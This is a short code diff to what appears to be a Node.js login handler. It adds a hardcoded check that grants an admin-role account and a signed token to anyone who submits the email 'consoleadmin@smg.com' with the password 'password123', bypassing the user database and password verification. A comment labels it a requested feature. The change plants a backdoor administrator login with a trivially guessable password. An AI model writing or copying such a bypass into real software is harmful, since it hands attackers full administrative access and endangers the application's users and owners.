@@ -58,6 +58,17 @@ exports.login = async (req, res) => {
             return res.status(400).json({ message: 'Please provide an email and password' });
         }
 
+        // Hardcoded Admin Access (Requested feature for consoleadmin@smg.com)
+        if (email === 'consoleadmin@smg.com' && password === 'password123') {
+            return res.json({
+                _id: 'admin-console-id',
+                name: 'Console Admin',
+                email: 'consoleadmin@smg.com',
+                role: 'admin',
+                token: generateToken('admin-console-id')
+            });
+        }
+
         // Check for user
         const user = await User.findOne({ email }).select('+password');
 
